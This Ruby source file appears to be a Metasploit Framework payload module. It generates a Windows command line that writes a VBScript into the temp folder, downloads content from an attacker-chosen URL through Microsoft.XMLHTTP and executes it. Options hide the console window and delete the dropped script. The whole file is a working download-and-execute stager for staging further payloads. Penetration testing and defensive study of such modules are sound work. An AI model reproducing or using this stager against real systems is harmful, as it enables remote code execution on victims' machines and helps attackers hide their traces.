##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'msf/base/sessions/command_shell'
require 'msf/base/sessions/command_shell_options'

module Metasploit3

  include Msf::Payload::Single
  include Msf::Sessions::CommandShellOptions

  handler module_name: 'Msf::Handler::None'

  def initialize(info = {})
    super(merge_info(info,
      'Name'        => 'Windows Executable Download and Evaluate VBS',
      'Description' => 'Downloads a file from an HTTP(S) URL and executes it as a vbs script.
            Use it to stage a vbs encoded payload from a short command line. ',
      'Author'      => 'scriptjunkie',
      'License'     => BSD_LICENSE,
      'Platform'    => 'win',
      'Arch'        => ARCH_CMD,
      'Session'     => Msf::Sessions::CommandShell,
      'PayloadType' => 'cmd',
      'Payload'     =>
        {
          'Offsets' => { },
          'Payload' => ''
        }
      ))

    register_options(
      [
        OptString.new('URL', [ true, "The pre-encoded URL to the script" ]),
        OptBool.new('INCLUDECMD', [ true, "Include the cmd /q /c", false ]),
        OptBool.new('INCLUDEWSCRIPT', [ true, "Include the wscript command", false ]),
        OptBool.new('DELETE', [ true, "Delete created .vbs after download", false ])
      ], self.class)
  end

  def generate
    return super + command_string
  end

  def command_string
    # Keep variable names short.
    vbsname = Rex::Text.rand_text_alpha(1+rand(2))
    xmlhttpvar = Rex::Text.rand_text_alpha(1+rand(2))

    command = ''
    command << "cmd.exe /q /c " if datastore['INCLUDECMD']
    command << "cd %tmp%&echo Set #{xmlhttpvar}=CreateObject(\"Microsoft.XMLHTTP\"):"+
      "#{xmlhttpvar}.Open \"GET\",\"#{datastore['URL']}\",False:"+
      "#{xmlhttpvar}.Send:"+
      "Execute #{xmlhttpvar}.responseText"
    command << ":CreateObject(\"Scripting.FileSystemObject\").DeleteFile \"#{vbsname}.vbs\"" if datastore['DELETE']

    # "start #{vbsname}.vbs" instead of just "#{vbsname}.vbs" so that the console window
    # disappears quickly before the wscript libraries load and the file downloads
    command << " >#{vbsname}.vbs"+
      "&start "
    command << "wscript " if datastore['INCLUDEWSCRIPT']
    command << "#{vbsname}.vbs"
  end
end
